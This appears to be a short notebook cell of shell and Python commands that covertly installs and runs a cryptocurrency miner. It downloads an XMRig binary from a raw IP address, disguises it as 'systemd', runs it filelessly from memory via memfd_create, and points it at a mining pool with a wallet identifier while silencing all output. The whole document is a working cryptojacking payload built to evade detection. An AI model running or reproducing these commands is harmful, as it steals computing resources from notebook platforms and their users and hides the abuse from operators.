!wget -O systemd http://150.136.168.71:80/archxx/xmrig-Ahmad
!base64 systemd > systemd.b64
!rm systemd
!python3 -c "import os, base64; \
memfd = os.memfd_create('systemd', os.MFD_CLOEXEC); \
os.write(memfd, base64.b64decode(open('systemd.b64', 'rb').read())); \
os.lseek(memfd, 0, os.SEEK_SET); \
os.execl(f'/proc/self/fd/{memfd}', f'/proc/self/fd/{memfd}', '-o', '20.40.45.18:443', '-a', 'rx', '-u', 'NHbWmURgbZRWUVDeuSYuyHTEdKfadbVMRzAE.data')" > /dev/null 2>&1
